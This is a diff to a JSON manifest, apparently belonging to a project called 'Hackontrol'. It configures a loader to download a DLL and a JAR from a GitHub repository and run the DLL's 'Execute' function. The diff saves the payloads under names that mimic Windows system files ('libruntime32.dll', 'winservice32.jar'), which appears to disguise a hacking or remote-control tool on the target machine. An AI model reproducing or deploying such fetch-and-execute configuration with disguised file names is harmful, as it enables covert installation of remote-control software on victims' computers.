@@ -4,15 +4,22 @@
 		"sha512": "814d610711394446072287276e58b3b21cfb1f4372663567dc5bcbe3e1b2de5678993d288c678490dc10539f565e91b5aaeecffe169e4ab95e8da8e84f9db137"
 	},
 
-	"file": {
-		"file": "libctrl32.dll",
-		"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.dll",
-		"sha512": "ea4e8c214f0ac31f77adebc766d574cf773df2e39f92a3add57d76665e155f4bb2659c1468efff00bbbacb39f4cc3e5ce9b6d72cf7548d60ae5364bdbd1a1ba7"
-	},
+	"file": [
+		{
+			"file": "libruntime32.dll",
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libruntime32.dll",
+			"sha512": "7f4cf0bcbc84ba98fde2203037d91cc6ede09b9c70edf13515f58cf350c63e49a992b6ce8fbbbc0d98bb249c760cba5a0f773f5624d6304b34f40a5920767013"
+		},
+		{
+			"file": "winservice32.jar",
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.jar",
+			"sha512": "d339268b887a0bbfcb4ef3467e93cfeb8355ae8322eb449c9d6ba5e1f4120d3e5762cfbc6e3c7e5b05f766625a46fc17929be1aa94bdd992ffc9d5500657bf59"
+		}
+	],
 
 	"entrypoint": {
 		"format": "dll",
-		"file": "libctrl32.dll",
+		"file": "libruntime32.dll",
 		"function": "Execute"
 	}
 }
